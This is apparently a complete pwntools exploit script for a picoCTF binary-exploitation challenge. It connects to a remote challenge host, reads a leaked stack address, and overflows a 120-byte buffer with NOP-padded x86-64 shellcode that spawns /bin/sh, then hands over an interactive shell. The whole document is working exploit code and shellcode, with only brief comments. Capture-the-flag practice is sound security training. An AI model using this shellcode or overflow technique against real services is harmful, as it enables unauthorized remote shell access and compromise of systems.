from pwn import *

shellcode = b'\x6a\x6c\x58\x0f\x05\x50\x50\x5f\x5e\x6a\x72\x58\x0f\x05\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x4d\x31\xc9\x41\x51\x53\x54\x5f\x6a\x3b\x58\x41\x51\x41\x51\x5e\x5a\x0f\x05'

target = remote("wily-courier.picoctf.net", 49315)

# Read in the leaked stack address 
inputAddr = int(target.recvline().strip(), 16)

# Skip the first input
target.sendline(b'a')

# Craft the payload: Place our shellcode on the stack, then return to it!
payload = shellcode + b'\x90'*(120-len(shellcode)) + p64(inputAddr)
target.sendline(payload)

# Our shellcode should execute /bin/sh, giving us a shell!
target.interactive()